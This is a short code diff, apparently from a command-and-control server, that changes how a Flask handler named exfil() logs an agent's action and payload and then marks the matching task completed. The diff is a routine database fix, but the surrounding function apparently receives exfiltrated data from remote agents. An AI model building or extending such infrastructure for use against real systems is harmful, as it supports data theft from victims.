@@ -597,16 +597,24 @@ def exfil():
             VALUES (?, ?, ?)
         """, (agent_id, action, json.dumps(payload)))
 
-        # Update corresponding task status to completed
+        # Find latest matching task
         c.execute("""
-            UPDATE tasks 
-            SET status = 'completed' 
-            WHERE agent_id = ? 
-            AND command = ? 
+            SELECT task_id FROM tasks
+            WHERE agent_id = ?
+            AND command = ?
             AND status IN ('pending', 'in_progress')
             ORDER BY task_id DESC 
             LIMIT 1
         """, (agent_id, action))
+                
+        row = c.fetchone()
+        if row:
+            task_id = row['task_id']
+            c.execute("""
+                UPDATE tasks
+                SET status = 'completed'
+                WHERE task_id = ?
+            """, (task_id,))
 
         conn.commit()
         return jsonify({'status': 'success'})
